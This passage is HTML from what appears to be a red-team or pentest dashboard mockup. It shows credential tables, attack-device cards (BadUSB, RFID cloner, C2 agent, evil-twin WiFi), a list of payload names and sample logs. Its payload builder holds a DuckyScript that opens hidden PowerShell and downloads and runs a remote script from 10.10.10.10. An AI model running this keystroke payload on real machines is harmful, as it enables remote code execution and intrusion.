                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>testuser@acmecorp.com</strong></td>
                                        <td><span class="asset-type user"> User Account</span></td>
                                        <td><span class="tag source">Client Provided</span></td>
                                        <td><span class="criticality medium">Test Account</span></td>
                                        <td>All systems</td>
                                        <td><span class="status completed">Valid</span></td>
                                        <td>10/11/2024</td>
                                        <td>
                                            <button class="table-btn" onclick="testCredential(this)" title="Test"></button>
                                            <button class="table-btn" onclick="copyCredential(this)" title="Copy"></button>
                                            <button class="table-btn" onclick="editCredential(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteCredential(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        
                        <!-- Mobile Card View -->
                        <div class="assets-mobile-view">
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">ACMECORP\administrator</div>
                                        <div class="asset-card-subtitle">Domain Admin - Password Spray</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="criticality critical">Domain Admin</span>
                                        <span class="status completed">Valid</span>
                                    </div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Test</button>
                                    <button class="table-btn"> Copy</button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="credentialsBulkActions" style="display: none;">
                            <div class="bulk-info">
                                <span id="credentialsSelectedCount">0</span> credentials selected
                            </div>
                            <div class="bulk-buttons">
                                <button class="bulk-btn" onclick="bulkTestCredentials()">Test Selected</button>
                                <button class="bulk-btn" onclick="bulkCopyCredentials()">Copy Selected</button>
                                <button class="bulk-btn danger" onclick="bulkDeleteCredentials()">Delete Selected</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="agents">
                    <div class="assets-container">
                        <!-- Agents Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">12</div>
                                    <div class="summary-label">Active Agents</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">8</div>
                                    <div class="summary-label">Connected</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">3</div>
                                    <div class="summary-label">Standby</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--danger);">1</div>
                                    <div class="summary-label">Offline</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="scanForAgents()"> Scan Network</button>
                                <button class="action-btn secondary" onclick="openPayloadBuilder()"> Payload Builder</button>
                                <button class="action-btn primary" onclick="deployNewAgent()"> Deploy Agent</button>
                            </div>
                        </div>

                        <!-- Agent Types Tabs -->
                        <div style="display: flex; gap: 0.5rem; margin-bottom: 1.5rem; border-bottom: 2px solid var(--border);">
                            <button class="tab-btn active" onclick="switchAgentTab('all')">All Agents</button>
                            <button class="tab-btn" onclick="switchAgentTab('esp32')">ESP32 HID</button>
                            <button class="tab-btn" onclick="switchAgentTab('badusb')">BadUSB</button>
                            <button class="tab-btn" onclick="switchAgentTab('espkey')">ESPKey</button>
                            <button class="tab-btn" onclick="switchAgentTab('network')">Network</button>
                            <button class="tab-btn" onclick="switchAgentTab('physical')">Physical Access</button>
                        </div>

                        <!-- Active Agents Grid -->
                        <div class="agents-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 1.5rem; margin-bottom: 2rem;">
                            
                            <!-- ESP32 Keyboard Agent -->
                            <div class="agent-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="agent-header" style="background: linear-gradient(135deg, #10b981, #059669); color: white; padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div>
                                            <h3 style="margin: 0 0 0.25rem 0; display: flex; align-items: center; gap: 0.5rem;">
                                                 ESP32-KBD-001
                                                <span class="status-indicator" style="width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: pulse 2s infinite;"></span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Keyboard HID Emulator</div>
                                        </div>
                                        <div style="font-size: 0.75rem; text-align: right;">
                                            <div>ONLINE</div>
                                            <div style="opacity: 0.8;">2ms ping</div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1rem;">
                                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-bottom: 1rem;">
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Target</div>
                                            <div style="font-weight: 500;">Reception PC</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Location</div>
                                            <div style="font-weight: 500;">Building A - Floor 2</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Payloads</div>
                                            <div style="font-weight: 500;">6 loaded</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Last Active</div>
                                            <div style="font-weight: 500;">2 min ago</div>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">Windows 10</span>
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">USB-C</span>
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">WiFi Control</span>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="executePayload('ESP32-KBD-001')"> Execute</button>
                                        <button class="table-btn" onclick="viewAgentLogs('ESP32-KBD-001')" title="Logs"></button>
                                        <button class="table-btn" onclick="configureAgent('ESP32-KBD-001')" title="Configure"></button>
                                        <button class="table-btn" onclick="disconnectAgent('ESP32-KBD-001')" title="Disconnect"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- BadUSB Rubber Ducky -->
                            <div class="agent-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="agent-header" style="background: linear-gradient(135deg, #f59e0b, #d97706); color: white; padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div>
                                            <h3 style="margin: 0 0 0.25rem 0; display: flex; align-items: center; gap: 0.5rem;">
                                                 DUCKY-003
                                                <span class="status-indicator" style="width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: pulse 2s infinite;"></span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">BadUSB Device</div>
                                        </div>
                                        <div style="font-size: 0.75rem; text-align: right;">
                                            <div>READY</div>
                                            <div style="opacity: 0.8;">Direct USB</div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1rem;">
                                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-bottom: 1rem;">
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Target</div>
                                            <div style="font-weight: 500;">Admin Workstation</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Script</div>
                                            <div style="font-weight: 500;">reverse_shell.dd</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Delay</div>
                                            <div style="font-weight: 500;">500ms</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Storage</div>
                                            <div style="font-weight: 500;">4GB / 8GB</div>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">DuckyScript</span>
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">Exfiltration</span>
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">Stealth Mode</span>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="armDevice('DUCKY-003')"> Arm Device</button>
                                        <button class="table-btn" onclick="editScript('DUCKY-003')" title="Edit Script"></button>
                                        <button class="table-btn" onclick="testPayload('DUCKY-003')" title="Test"></button>
                                        <button class="table-btn" onclick="cloneDevice('DUCKY-003')" title="Clone"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- ESPKey RFID/NFC -->
                            <div class="agent-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="agent-header" style="background: linear-gradient(135deg, #8b5cf6, #7c3aed); color: white; padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div>
                                            <h3 style="margin: 0 0 0.25rem 0; display: flex; align-items: center; gap: 0.5rem;">
                                                 ESPKEY-002
                                                <span class="status-indicator" style="width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: pulse 2s infinite;"></span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">RFID/NFC Emulator</div>
                                        </div>
                                        <div style="font-size: 0.75rem; text-align: right;">
                                            <div>ARMED</div>
                                            <div style="opacity: 0.8;">Battery 78%</div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1rem;">
                                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-bottom: 1rem;">
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Target</div>
                                            <div style="font-weight: 500;">Server Room Door</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Card Type</div>
                                            <div style="font-weight: 500;">HID Prox II</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Captured</div>
                                            <div style="font-weight: 500;">23 cards</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Active Card</div>
                                            <div style="font-weight: 500;">Admin-042</div>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">125kHz</span>
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">13.56MHz</span>
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">Mifare</span>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="emulateCard('ESPKEY-002')"> Emulate</button>
                                        <button class="table-btn" onclick="viewCapturedCards('ESPKEY-002')" title="Cards"></button>
                                        <button class="table-btn" onclick="scanForCards('ESPKEY-002')" title="Scan"></button>
                                        <button class="table-btn" onclick="bruteForce('ESPKEY-002')" title="Brute Force"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- Network C2 Agent -->
                            <div class="agent-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="agent-header" style="background: linear-gradient(135deg, #3b82f6, #2563eb); color: white; padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div>
                                            <h3 style="margin: 0 0 0.25rem 0; display: flex; align-items: center; gap: 0.5rem;">
                                                 C2-AGENT-007
                                                <span class="status-indicator" style="width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: pulse 2s infinite;"></span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Command & Control</div>
                                        </div>
                                        <div style="font-size: 0.75rem; text-align: right;">
                                            <div>ACTIVE</div>
                                            <div style="opacity: 0.8;">TLS 1.3</div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1rem;">
                                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-bottom: 1rem;">
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Host</div>
                                            <div style="font-weight: 500;">192.168.1.105</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">OS</div>
                                            <div style="font-weight: 500;">Windows Server</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Uptime</div>
                                            <div style="font-weight: 500;">3h 24m</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Beacon</div>
                                            <div style="font-weight: 500;">60s interval</div>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">Encrypted</span>
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">Persistent</span>
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">Admin Rights</span>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="openShell('C2-AGENT-007')"> Shell</button>
                                        <button class="table-btn" onclick="downloadFiles('C2-AGENT-007')" title="Download"></button>
                                        <button class="table-btn" onclick="uploadPayload('C2-AGENT-007')" title="Upload"></button>
                                        <button class="table-btn" onclick="selfDestruct('C2-AGENT-007')" title="Destroy" style="color: var(--danger);"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- WiFi Pineapple -->
                            <div class="agent-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="agent-header" style="background: linear-gradient(135deg, #ec4899, #be185d); color: white; padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div>
                                            <h3 style="margin: 0 0 0.25rem 0; display: flex; align-items: center; gap: 0.5rem;">
                                                 PINEAPPLE-01
                                                <span class="status-indicator" style="width: 8px; height: 8px; background: #fbbf24; border-radius: 50%;"></span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">WiFi Attack Platform</div>
                                        </div>
                                        <div style="font-size: 0.75rem; text-align: right;">
                                            <div>STANDBY</div>
                                            <div style="opacity: 0.8;">12 clients</div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1rem;">
                                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-bottom: 1rem;">
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">SSID</div>
                                            <div style="font-weight: 500;">FreeWiFi_Guest</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Channel</div>
                                            <div style="font-weight: 500;">6 (2.4GHz)</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Captured</div>
                                            <div style="font-weight: 500;">142 handshakes</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Portal</div>
                                            <div style="font-weight: 500;">Office365 Clone</div>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">Evil Twin</span>
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">Captive Portal</span>
                                        <span class="tag" style="font-size: 0.75rem; background: var(--bg-primary);">MITM</span>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn warning" style="flex: 1;" onclick="startAttack('PINEAPPLE-01')"> Start Attack</button>
                                        <button class="table-btn" onclick="viewClients('PINEAPPLE-01')" title="Clients"></button>
                                        <button class="table-btn" onclick="captureTraffic('PINEAPPLE-01')" title="Capture"></button>
                                        <button class="table-btn" onclick="deauth('PINEAPPLE-01')" title="Deauth"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- Offline Agent -->
                            <div class="agent-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden; opacity: 0.7;">
                                <div class="agent-header" style="background: linear-gradient(135deg, #6b7280, #4b5563); color: white; padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div>
                                            <h3 style="margin: 0 0 0.25rem 0; display: flex; align-items: center; gap: 0.5rem;">
                                                 ESP32-KBD-004
                                                <span class="status-indicator" style="width: 8px; height: 8px; background: #ef4444; border-radius: 50%;"></span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Keyboard HID Emulator</div>
                                        </div>
                                        <div style="font-size: 0.75rem; text-align: right;">
                                            <div style="color: #ef4444;">OFFLINE</div>
                                            <div style="opacity: 0.8;">Lost 5m ago</div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1rem;">
                                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-bottom: 1rem;">
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Last Target</div>
                                            <div style="font-weight: 500;">Kiosk Terminal</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Location</div>
                                            <div style="font-weight: 500;">Lobby</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Last Seen</div>
                                            <div style="font-weight: 500;">10:45 AM</div>
                                        </div>
                                        <div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Status</div>
                                            <div style="font-weight: 500; color: var(--danger);">Disconnected</div>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn secondary" style="flex: 1;" onclick="attemptReconnect('ESP32-KBD-004')"> Reconnect</button>
                                        <button class="table-btn" onclick="viewLastLogs('ESP32-KBD-004')" title="Last Logs"></button>
                                        <button class="table-btn" onclick="removeAgent('ESP32-KBD-004')" title="Remove" style="color: var(--danger);"></button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Payload Builder Section -->
                        <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; border: 1px solid var(--border); margin-bottom: 2rem;">
                            <h3 style="color: var(--text-primary); margin-bottom: 1.5rem; display: flex; align-items: center; justify-content: space-between;">
                                 Quick Payload Builder
                                <button class="btn-secondary" onclick="openAdvancedBuilder()"> Advanced Builder</button>
                            </h3>
                            
                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
                                <div>
                                    <h4 style="margin-bottom: 1rem; color: var(--text-primary);">Common Payloads</h4>
                                    <div style="display: flex; flex-direction: column; gap: 0.5rem;">
                                        <button class="payload-btn" onclick="loadPayload('reverse-shell')">
                                            <span></span> Reverse Shell (PowerShell)
                                        </button>
                                        <button class="payload-btn" onclick="loadPayload('disable-defender')">
                                            <span></span> Disable Windows Defender
                                        </button>
                                        <button class="payload-btn" onclick="loadPayload('extract-wifi')">
                                            <span></span> Extract WiFi Passwords
                                        </button>
                                        <button class="payload-btn" onclick="loadPayload('screenshot')">
                                            <span></span> Screenshot & Upload
                                        </button>
                                        <button class="payload-btn" onclick="loadPayload('rickroll')">
                                            <span></span> Rickroll (Safe Demo)
                                        </button>
                                        <button class="payload-btn" onclick="loadPayload('exfiltrate')">
                                            <span></span> Data Exfiltration
                                        </button>
                                    </div>
                                </div>
                                
                                <div>
                                    <h4 style="margin-bottom: 1rem; color: var(--text-primary);">Keystroke Sequence</h4>
                                    <div class="form-group">
                                        <label class="form-label">Target OS</label>
                                        <select class="form-select" id="targetOS">
                                            <option value="windows">Windows 10/11</option>
                                            <option value="macos">macOS</option>
                                            <option value="linux">Linux (Ubuntu)</option>
                                            <option value="android">Android</option>
                                        </select>
                                    </div>
                                    
                                    <div class="form-group">
                                        <label class="form-label">Delay (ms)</label>
                                        <input type="number" class="form-input" id="payloadDelay" value="500" min="0" max="10000">
                                    </div>
                                    
                                    <div class="form-group">
                                        <label class="form-label">Script</label>
                                        <textarea class="form-textarea" id="payloadScript" style="font-family: monospace; min-height: 150px;">REM Open Run Dialog
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
STRING IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/payload.ps1')
ENTER</textarea>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" onclick="testPayload()"> Test</button>
                                        <button class="action-btn secondary" onclick="savePayload()"> Save</button>
                                        <button class="action-btn secondary" onclick="deployToAgent()"> Deploy</button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Agent Logs -->
                        <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; border: 1px solid var(--border);">
                            <h3 style="color: var(--text-primary); margin-bottom: 1.5rem; display: flex; align-items: center; justify-content: space-between;">
                                 Recent Agent Activity
                                <div style="display: flex; gap: 0.5rem;">
                                    <select class="form-select" style="width: auto;">
                                        <option>All Agents</option>
                                        <option>ESP32 Devices</option>
                                        <option>Network Agents</option>
                                        <option>Physical Access</option>
                                    </select>
                                    <button class="btn-secondary" onclick="refreshLogs()"> Refresh</button>
                                </div>
                            </h3>
                            
                            <div style="background: var(--bg-primary); border-radius: 8px; border: 1px solid var(--border); padding: 1rem; font-family: monospace; font-size: 0.875rem; max-height: 300px; overflow-y: auto;">
                                <div style="color: var(--success);">[10:52:14] ESP32-KBD-001: Connected successfully to target</div>
                                <div style="color: var(--text-primary);">[10:52:15] ESP32-KBD-001: Executing payload 'reverse_shell.dd'</div>
                                <div style="color: var(--warning);">[10:52:18] ESP32-KBD-001: Keystroke delay detected, adjusting timing...</div>
                                <div style="color: var(--success);">[10:52:22] ESP32-KBD-001: Payload executed successfully</div>
                                <div style="color: var(--text-primary);">[10:52:23] C2-AGENT-007: New connection from 192.168.1.105</div>
                                <div style="color: var(--success);">[10:52:24] C2-AGENT-007: Shell established with SYSTEM privileges</div>
                                <div style="color: var(--text-primary);">[10:51:45] ESPKEY-002: Captured new RFID card - ID: 0x2A4B6C8D</div>
                                <div style="color: var(--warning);">[10:51:30] PINEAPPLE-01: 3 new clients connected to honeypot</div>
                                <div style="color: var(--danger);">[10:47:02] ESP32-KBD-004: Connection lost - timeout</div>
                                <div style="color: var(--text-primary);">[10:46:55] DUCKY-003: Armed and ready for insertion</div>
                                <div style="color: var(--success);">[10:45:12] ESPKEY-002: Successfully emulated Admin-042 card</div>
                                <div style="color: var(--text-primary);">[10:44:33] PINEAPPLE-01: Captured WPA2 handshake from client 5C:AA:FD:22:11:33</div>
                            </div>
                        </div>
                        
                        <style>
                            .agents-grid {
                                display: grid;
                                grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
                                gap: 1.5rem;
                            }
                            
                            @media (max-width: 768px) {
                                .agents-grid {
                                    grid-template-columns: 1fr !important;
                                }
                            }
                            
                            .agent-card:hover {
                                transform: translateY(-2px);
                                transition: transform 0.2s ease;
                            }
                            
                            @keyframes pulse {
                                0% { opacity: 1; }
                                50% { opacity: 0.5; }
                                100% { opacity: 1; }
                            }
                            
                            .payload-btn {
                                display: flex;
                                align-items: center;
                                gap: 0.75rem;
                                padding: 0.75rem 1rem;
                                background: var(--bg-primary);
                                border: 1px solid var(--border);
                                border-radius: 6px;
                                color: var(--text-primary);
                                cursor: pointer;
                                transition: all 0.2s ease;
                                text-align: left;
                            }
                            
                            .payload-btn:hover {
                                background: var(--button-primary);
                                color: white;
                                transform: translateX(4px);
                            }
                            
                            .payload-btn span {
                                font-size: 1.25rem;
                            }
                            
                            .tab-btn {
                                padding: 0.75rem 1.25rem;
                                background: transparent;
                                border: none;
                                color: var(--text-secondary);
                                cursor: pointer;
                                border-bottom: 2px solid transparent;
                                transition: all 0.2s ease;
                            }
                            
                            .tab-btn:hover {
                                color: var(--text-primary);
                            }
                            
                            .tab-btn.active {
                                color: var(--button-primary);
                                border-bottom-color: var(--button-primary);
                            }
                        </style>
                    </div>
                </div>
                
                <div class="screen-content" id="plugins">
                    <div class="placeholder-content">
                        <div class="placeholder-icon"></div>
                        <h3 class="placeholder-title">Plugins</h3>
                        <p class="placeholder-text">Python extensions.</p>
                    </div>
                </div>
                
                <div class="screen-content" id="ingestors">
                    <div class="assets-container">
                        <!-- Data Ingestion Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">7</div>
                                    <div class="summary-label">Tool Parsers</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">45</div>
                                    <div class="summary-label">Files Processed</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">238</div>
                                    <div class="summary-label">Findings Imported</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--text-accent);">3.2GB</div>
                                    <div class="summary-label">Data Processed</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportIngestionReport()"> Export Report</button>
                                <button class="action-btn secondary" onclick="openIngestionSettings()"> Settings</button>
                                <button class="action-btn primary" onclick="openBulkUploader()"> Bulk Upload</button>
                            </div>
                        </div>

                        <!-- Tool Parsers Grid -->
                        <div class="ingestion-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 1.5rem; margin-bottom: 2rem;">
                            
                            <!-- Nmap Parser -->
                            <div class="parser-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="parser-header" style="background: linear-gradient(135deg, #059669, #065f46); color: white; padding: 1.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                                 Nmap
                                                <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Network Discovery</span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Network scanning and service discovery</div>
                                        </div>
                                        <div class="parser-status">
                                            <span style="color: #10b981; font-size: 1.2rem;"></span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1.5rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Supported Formats:</div>
                                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                                            <span class="tag" style="font-size: 0.75rem;">XML Output</span>
                                            <span class="tag" style="font-size: 0.75rem;">Gnmap</span>
                                            <span class="tag" style="font-size: 0.75rem;">JSON</span>
                                        </div>
                                    </div>
                                    
                                    <div style="margin-bottom: 1rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                                            <span style="font-size: 0.875rem; color: var(--text-secondary);">Last processed: 2 hours ago</span>
                                            <span style="font-size: 0.875rem; color: var(--success);">15 hosts discovered</span>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="uploadFile('nmap')"> Upload Files</button>
                                        <button class="table-btn" onclick="viewIngestionHistory('nmap')" title="History"></button>
                                        <button class="table-btn" onclick="configureParser('nmap')" title="Configure"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- Nessus Parser -->
                            <div class="parser-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="parser-header" style="background: linear-gradient(135deg, #dc2626, #991b1b); color: white; padding: 1.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                                 Nessus
                                                <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Vulnerability Scanner</span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Vulnerability assessment results</div>
                                        </div>
                                        <div class="parser-status">
                                            <span style="color: #10b981; font-size: 1.2rem;"></span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1.5rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Supported Formats:</div>
                                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                                            <span class="tag" style="font-size: 0.75rem;">.nessus XML</span>
                                            <span class="tag" style="font-size: 0.75rem;">CSV Export</span>
                                        </div>
                                    </div>
                                    
                                    <div style="margin-bottom: 1rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                                            <span style="font-size: 0.875rem; color: var(--text-secondary);">Last processed: 4 hours ago</span>
                                            <span style="font-size: 0.875rem; color: var(--danger);">42 vulnerabilities</span>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="uploadFile('nessus')"> Upload Files</button>
                                        <button class="table-btn" onclick="viewIngestionHistory('nessus')" title="History"></button>
                                        <button class="table-btn" onclick="configureParser('nessus')" title="Configure"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- TestSSL Parser -->
                            <div class="parser-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="parser-header" style="background: linear-gradient(135deg, #7c3aed, #5b21b6); color: white; padding: 1.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                                 TestSSL
                                                <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">SSL/TLS Testing</span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">SSL/TLS configuration analysis</div>
                                        </div>
                                        <div class="parser-status">
                                            <span style="color: #10b981; font-size: 1.2rem;"></span>
                                        </div>
                                    </div>
                                </div>
                                
